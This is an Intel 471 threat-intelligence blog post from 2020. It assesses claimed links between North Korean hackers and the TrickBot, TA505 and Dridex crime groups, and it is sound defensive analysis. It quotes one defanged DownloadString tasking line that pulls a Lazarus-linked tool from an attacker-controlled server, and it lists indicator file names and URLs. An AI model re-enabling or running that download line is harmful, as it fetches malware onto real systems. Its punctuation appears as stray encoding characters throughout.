Partners in crime: North Koreans and elite Russian-speaking cybercriminals
public.intel471.com/blog/partners-in-crime-north-koreans-and-elite-russian-speaking-cybercriminals
September 16, 2020

By. Intel 471 . September 16, 2020
By Mark Arena, CEO of Intel 471.
This blog post takes a look at the credibility of claims in public reports of North Korean(referred to as DPRK for the rest of this post) links to Russian-speaking cybercriminals.The post is based as much as possible on public and open sources from credible partiesthat can be referenced rather than introducing new or confidential sources ofinformation. We examine TrickBot, TA505 and Dridex, believed to originate from EasternEurope, and attempt to understand potential linkages between these and DPRK threatactors.
For the purpose of this blog post, we are making the following generally acceptedassumptions:.
Lazarus/Lazarus Group is tied to DPRK threat actors.
TrickBot, TA505 and Dridex are tied to Russian-speaking cybercriminals.

It is outside the scope of this blog post to explain or justify this attribution.
Key findings
DPRK threat actors likely are active in the cybercriminal underground and maintaintrusted relationships with top-tier Russian-speaking cybercriminals.
Malware believed to be only used and probably written by DPRK threat actors wasvery likely delivered via network accesses held by Russian-speaking cybercriminals(TrickBot, TA505).

Seeking assistance
On Aug. 28, 2020, I posted a tweet asking a number of security researchers for originalsource data/information that linked Lazarus to Dridex or TrickBot. My tweet indicatedthat I was skeptical of alleged links between DPRK threat actors and the actors behindTrickBot, TA505 and Dridex.
TrickBot, TA505 and the cybercriminal underground
The ※cybercriminal underground,§ as we like to call it at Intel 471, is an organizedecosystem of products, services and goods consisting of real-life suppliers and consumerswho can be mapped, tracked, understood and exposed. Participation and entry into theunderground at the bottom tiers is easy. Becoming trusted, verified and achieving a goodunderground reputation takes years of work. We assess the operators and customers ofTrickBot and the actors that make up TA505 as top-tier cybercriminals.
TrickBot is a private malware-as-a-service (MaaS) offering, run by Russian-speakingcybercriminals, that is not openly advertised on any open or invite-only cybercriminalforum or marketplace. It is determined by Intel 471 that only top-tier cybercriminals witha proven reputation can access the service. Reputation is gained through being involvedin buying and selling products, services and goods in the cybercriminal underground.Even identifying who to talk to about accessing TrickBot would require a significantamount of activity and reputation in the underground. Therefore, the ability of DPRKthreat actors to communicate with operators or customers of TrickBot would mean theyare considered top-tier cybercriminals in their own right.
Intel 471 also believes TA505 actors are heavily involved in the cybercriminalunderground based on the amount of tooling they have purchased from there. A numberof organizations incorrectly link threat activity to TA505, so more information on what weconsider to be TA505 threat activity is available in Annex 1: Defining TA505 at the bottomof this post..
Attributing threat actors who use a shared MaaS 每 TrickBot
When examining malware families that are shared MaaS offerings like TrickBot, one mustunderstand how to identify different users of the shared criminal service. With TrickBot,the malware has a hard-coded parameter in each sample called the gtag. This is thoughtto be a campaign identifier, useful for tracking the TrickBot operators＊ different spreadingmechanisms.
Palo Alto＊s Unit 42 (Brad Duncan) wrote a blog that was published on May 28, 2020, andincluded the following:
Every TrickBot binary has an identifier called a gtag. This is found in configurationdata extracted from a TrickBot binary. Gtags can also be found in HTTP traffic during aTrickBot infection. They indicate the specific campaign or source of infection used for aTrickBot binary.
The gtag is a short alphabetic string followed by a number representing a one-upserialization. Examples follow:
mor-series gtag: TrickBot caused by an Emotet infection, for example: TrickBotgtag mor84 caused by Emotet on January 27th, 2020.
ono-series gtag: various TrickBot infections initiated through malicious MicrosoftOffice documents like Word documents or Excel spreadsheets, distributed throughEnglish-language emails.
red-series gtag: TrickBot distributed as a DLL file instead of an EXE, for example:TrickBot gtag red5 documented on March 17th, 2020.

Linking DPRK threat actors to TrickBot 每 LEXFO＊s analysis
On Feb. 19, 2020, a report by the French information security consultancy LEXFO titled※The Lazarus Constellation 每 A study on North Korean malware§ was published. A sectionof the report is titled Clarifying links with TA505 (Emotet, TrickBot & Dridex). Whileincluding some unclear and unexplained links between TA505 and Emotet (we＊ve neverseen TA505 use Emotet) as well as TrickBot and Dridex (see Annex 1: Defining TA505),the report claims:
DPRK threat actors have used a piece of ransomware called Hermes, which was soldin the underground ※for as little as $300 in 2017/2018§ and Ryuk ransomwareshares most of its code with Hermes.
※Researchers reported that they saw previous Lazarus infections cohabit withEmotet and TrickBot, which can also be observed during a forensic mission.§

Intel 471 was able to verify that Hermes was offered for sale (posted in both Russian andEnglish) by the actor CryptoTech on a Russian-language cybercriminal forum in mid-2017.
Linking DPRK threat actors to TrickBot 每 PowerBrace
On July 11, 2019, NTT Security published a blog post titled ※Targeted TrickBot activitydrops ＆PowerBrace＊ backdoor.§ While the blog post incorrectly states the May 2019observed activity is possibly linked to TA505 (see Annex 1: Defining TA505), it does coveran incident where TrickBot was used to deliver the PowerBrace backdoor, which BAEattributes to DPRK threat actors.
NTT Security＊s blog post unfortunately also doesn＊t shed light on the precursor event tothe specific TrickBot infection that led to PowerBrace being dropped onto the system oron what version and gtag of the TrickBot infections were dropping PowerBrace.
Linking DPRK threat actors to TrickBot 每 Anchor and PowerRatankba
On Dec. 10, 2019, SentinelOne researchers published a blog post and report titled※Anchor Project | The Deadly Planeswalker: How The TrickBot Group United High-TechCrimeware & APT.§ The report claimed TrickBot actors had ※refactored and repurposed§TrickBot into an ※attack framework leveraging the project called ＆Anchor'§ and thatAnchor was being ※leveraged to actively attack medium-sized retail businesses amongstother corporate entities using point-of-sale (POS) systems.§ Their research also revealeda ※command-and-control tasking for a compromised machine to download a specifictool linked to the Lazarus PowerRatankba§ from Anchor. The specific tasking was:
DownloadString(＆hxxps://ecombox[.]store/tbl_add.php?action=cgetpsa＊)
A day later (Dec. 11, 2019), Cybereason published a blog post titled ※Dropping Anchor:From a TrickBot infection to the discovery of the Anchor malware§ that said (without anymentioned links to DPRK threat actors or tooling) that Anchor was focused on targetingPoS systems. They further described Anchor as being ※used very selectively on high-profile targets§ and appearing to be ※tightly connected to TrickBot.§ The infection vectordescribed by Cybereason ※starts with a phishing email that contains a malicious link to afile hosted on Google Docs named ＆Annual Bonus Report.doc.＊ When the user clicks onthe link, the TrickBot dropper downloads onto the target machine. This differs fromprevious TrickBot attacks we have seen, where TrickBot is usually dropped through aMicrosoft Office document or by another malware like Emotet.§.
NTT Security also published a blog post titled ※TrickBot variant ＆Anchor_DNS＊communicating over DNS§ on July 6, 2020. This post covers (without any mentionedlinks to DPRK threat actors or tooling) NTT seeing ※Anchor_DNS§ deployed against thefinancial sector and against ※high impact servers such as AD [Active Directory]controllers.§ They explain the infection vector as being ※the typical distribution methodsof TrickBot, such as mail-spam and malware droppers.§ NTT describes the deploymentof selected malware depending on the target but describes their visibility showing thatransomware and PoS are ※prevalent.§ They also describe the TrickBot gtags related to thisactivity as ※tot548, ser501, etc.§
Of the three posts on Anchor, only one mentioned observing a tool believed to be linkedto DPRK threat actors. SentinelOne reported seeing a command-and-control tasking (viaAnchor) to download PowerRatankba to an infected system. PowerRatankba is alsomentioned in a blog post published on Jan. 15, 2019, from Flashpoint that covers aDecember 2018 intrusion into a ※Chilean interbank network Redbanc§ that is said toinvolve PowerRatankba.
PowerRatankba has only been reported to have been used in a small number ofcompromises, mainly against financial institutions, and SentinelOne claims it was pushedvia Anchor with a TrickBot infection being a precursor to what SentinelOne reported.According to an open source report on the incident against Redbanc as described inFlashpoint＊s blog post, an employee of Redbanc was socially engineered to run a filenamed ApplicationPDF.exe. Flashpoint＊s analysis of this file is that ApplicationPDF.exe isa dropper that ※displays a fake job application form while downloading and executingPowerRatankba§ and that hxxps://ecombox[.]store/tbl_add.php?action=agetpsb iscalled. This is the same server and a very similar get request as described by SentinelOnein their research on Anchor.
Building upon Flashpoint＊s analysis, QuoIntelligence published a blog post on Jan. 21,2019, stating they believe the targeting of multiple Pakistani bank employees by DPRKactors had occurred. In the case they describe, ApplicationPDF.exe (also connected toecombox[.]store and described as PowerRatankba) was also used and their ※analysisrevealed the victim being an employee at a financial services provider in Pakistan andknowledgeable in financial systems and technologies including Point-of-Sales (POS) andAutomated Teller Machine (ATMs).§
Proofpoint, in their post and report titled ※North Korea Bitten by Bitcoin Bug: Financiallymotivated campaigns reveal new dimension of the Lazarus Group§ and published on Dec.19, 2017, describes PowerRatankba as a ※PowerShell-based malware variant that closelyresembles the original Ratankba implant.§ Proofpoint writes that they ※believe thatPowerRatankba was likely developed as a replacement in Lazarus Group＊s strictlyfinancially motivated team＊s arsenal to fill the hole left by Ratankba＊s discovery.§Proofpoint also links to a blog post from Trendmicro titled ※Ratankba: Delving intoLarge-scale Watering Holes§ and published on Feb. 27, 2017, which talks about Ratankbabeing ※tied to malware attacks against banks in Poland, but also in a string of similarincidents involving financial institutions in different countries.§ Trendmicro＊s attributionanalysis of Ratankba:
Were the attacks carried out by cybercriminal group Lazarus?
While there is ambivalence if they were indeed their handiwork, our analysis indicatesthat the malware codes and techniques employed resembled those used by Lazarus.
DPRK threat actors likely linked to TrickBot operators or users
Based on the above examined links between DPRK threat and TrickBot, we assess it islikely there is a link between the operators or users of TrickBot and DPRK threat actors.TrickBot certainly appears to be a source of compromised accesses that DPRK threatactors can leverage. The operators or users of TrickBot seem to be well-versed inidentifying interesting organizations they＊ve compromised for follow-up intrusionactivity, be it through Anchor or common intrusion tools (Metasploit, Cobalt Strike,BloodHound, Empire, etc.), or to pass off or sell to other threat actors, i.e., DPRK threatactors.
The precursor to a TrickBot infection and the version and gtag of a TrickBot sample thatleads to DPRK tooling needs to be better understood for any future analysis of DPRKlinks to TrickBot. There is not enough original source information available within opensources to understand if all TrickBot infections could potentially lead to DPRK threatactors or only a subset of TrickBot infections could lead to a DPRK intrusion. Only asubset of TrickBot infections leading to DPRK intrusions could mean thatusers/customers of TrickBot are linked to DPRK threat actors rather than the operators ofthe TrickBot MaaS.
Linking DPRK threat actors to TA505
On April 10, 2019, the researcher Norfolk wrote a blog post titled ※OSINT ReportingRegarding DPRK and TA505 Overlap.§ This blog post quotes a 2019 BAE Systemspresentation from Kaspersky＊s annual security researcher conference (SAS) that mentionsa ※possible overlap between TA505 intrusions and DPRK intrusions, suggesting a possiblehand-off between the two groups.§
Norfolk＊s post included a link to an article from Wired that was posted on April 9, 2019,and titled ※A New Breed of ATM Hackers Gets in Through a Bank＊s Network.§ Within theWired article are quotes from BAE Systems Intelligence Analyst Saher Naumaan (one ofthe presenters of the presentation at SAS) with regard to links between Lazarus andTA505:
In their incident response work with banks, BAE Systems analysts repeatedly noticedthat the victim networks they were studying were infected with both a malware dubbedGraceWire and known Lazarus malware tools. The researchers also found possible linksbetween GraceWire and a well-known financially motivated criminal hacking gangcalled TA505. Though Naumaan says it is too early to draw definitive conclusions aboutthese overlaps, it＊s possible that Lazarus has been contracting with TA505 or othergroups to gain access to financial networks.
※There is kind of a central theory that＊s being considered that TA505 may be the one tocompromise the network and get the initial access and then sell that access to Lazarus,§Naumaan says. ※This would be interesting because in most of these fraud incidents wedidn＊t know the intrusion vector〞that was one of the biggest unknowns.§
Saher Naumaan also clarified the link between TA505 and Lazarus on Twitter:
Also just to clarify, in my talk I said it was just a theory and we can＊t verify it, and thereare other theories as well
Intel 471＊s own analysis is that GraceWire aka FlawedGrace (as mentioned in theaforementioned Wired article) was observed being used by TA505. Proofpoint also linkedthe use of GraceWire to TA505 in an early 2019 blog post. Intel 471 is not aware of anythreat actors that have used GraceWire other than TA505.
Despite BAE＊s claim of the discovery of compromised financial sector systems havingtooling believed to be only used by TA505 alongside tooling only used by DPRK threatactors, it is difficult to independently conclude a solid link exists between TA505 andDPRK threat actors without seeing original source data/information. Furtherexamination is required to understand how many victim networks BAE analysts sawTA505 and DPRK tooling alongside each other and in the context in which they were seentogether.
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) recently released analert titled ※FASTCash 2.0: North Korea＊s BeagleBoyz Robbing Banks on 26 August2020.§ This alert specifically mentions that DPRK threat actors may ※be working with orcontracting out to criminal hacking groups, like TA505, for initial access development.§
Although we haven＊t been able to conclusively link DPRK and TA505 through opensources, conversations we＊ve had with other members of the security community have leftus with the opinion that TA505 historically worked on occasion with DPRK threat actors,although that doesn＊t seem to have occurred recently.
No information to suggest DPRK threat actors are linked with Dridex
See Annex 2: No link found between DPRK threat actors and the actors behind Dridex.
Final remarks
Our conclusion is that we deem it likely that threat actors running or having access toTrickBot infections are in contact with DPRK threat actors. While it is hard to assess, itlooks likely that the network accesses purchased by DPRK threat actors from TrickBot-linked actors were from financial institutions. It also appears that DPRK threats actorshave multiple other sources of network accesses beyond just TrickBot infections and thattwo such additional sources are accesses sold in the cybercriminal underground andaccesses obtained through social engineering. The number of increasing network accessessold by other cybercriminals in the underground could enable DPRK threat actors tofocus greater efforts on developing tooling and tactics, techniques and procedures (TTPs)for maintaining persistence and operating within compromised networks rather thaninitial access efforts.
Annex 1: Defining TA505
Defining TA505 is a somewhat difficult task because of their decentralized organization.Numerous organizations (Intel 471 included) have their own view on what is and isn＊tTA505, but with Proofpoint first coming up with the name, it＊s only fair that we use theirdescription as a basis for this post. The first TA505 mention we could find fromProofpoint is their blog post from Sept. 27, 2017, titled ※Threat Actor Profile: TA505,From Dridex to GlobeImposter.§.
Proofpoint researchers track a wide range of threat actors involved in both financiallymotivated cybercrime and state-sponsored actions. One of the more prolific actors thatwe track 每 referred to as TA505 每 is responsible for the largest malicious spamcampaigns we have ever observed, distributing instances of the Dridex banking Trojan,Locky ransomware, Jaff ransomware, The Trick banking Trojan [Trick = TrickBot],and several others in very high volumes.
Because TA505 is such a significant part of the email threat landscape, this blogprovides a retrospective on the shifting malware, payloads, and campaigns associatedwith this actor. We examine their use of malware such as Jaff, Bart, and Rockloaderthat appear to be exclusive to this group as well as more widely distributed malwarelike Dridex and Pony. 
＃
The last TA505 campaigns featuring The Trick appeared in mid-September 2017 withpayloads alternating between Locky and The Trick.
From this, we can ascertain that Proofpoint believes that TA505 uses a number ofdifferent tools that other cybercriminals also use, but they believe they are the exclusiveusers of Jaff, Bart and Rocketloader. From that write-up, Proofpoint believes TA505 usesboth Dridex and TrickBot, but other actors also use them.
Common attribution mistakes regarding TA505 that we see are:
Claiming TA505 developed Dridex. TA505 was a customer of Dridex from 2014 to2017 and stopped using Dridex in 2018. Sources for this are the FrenchCybersecurity Agency ANSSI and NCC Group. Evil Corp is the group behind Dridex,a number of whose members were publicly indicted in late 2019 by the U.S.Department of Justice..
Equating all Emotet or TrickBot activity to TA505. TA505 never used Emotet andonly used TrickBot for a short period of time in late 2017.

Annex 2: No link found between DPRK threat actors and the actors behindDridex
On Nov. 15, 2017, Jerome Kehrli posted a blog post titled ※Deciphering the Bangladeshbank heist§ that included the mention of a ※custom Dridex worm§ with the file nameevtdiag.exe used in the hack of Bangladesh Bank. Kehrli＊s blog post is frequently cited asthe source of linkage between Lazarus and Dridex. Two security researchers on Twitterpointed out that evtdiag.exe was not Dridex but a Lazarus-linked tool. Kehrli respondedto this with confirmation that the belief was that evtdiag.exe was Dridex at the time but itwasn＊t confirmed. As a result, Kehrli said that he would update the article to reflect thisinformation.
Based on Kehrli＊s response and no other primary source information or data, no otherlinks between Dridex and Lazarus were found.
Annex 3: How to protect your organization from DPRK threat actors givenaccess through a TrickBot infection
The first order of business for any organization is to have good security hygiene, includingbut not limited to ongoing security monitoring, a detection strategy, and response andrecovery. No matter the spreading mechanism for TrickBot, all TrickBot samples use thesame command and control server list. By blocking these control servers, TrickBot willnot be able to call home to the criminal＊s servers. Once the criminals behind TrickBothave identified an access of interest, the network defender is racing against the clock.Possible next steps for the criminals are ransomware attacks or providing/selling accessto other actors, i.e., DPRK threat actors.
Related Content
Flowspec 每 TA505＊s bulletproof hoster of choice
Here at Intel 471 we spend a fair amountof time tracking malicious infrastructureproviders. In the world of cybercrime themalicious infrastructure provider, orBulletproof Hoster (BPH) as they arecalled in the underground marketplace








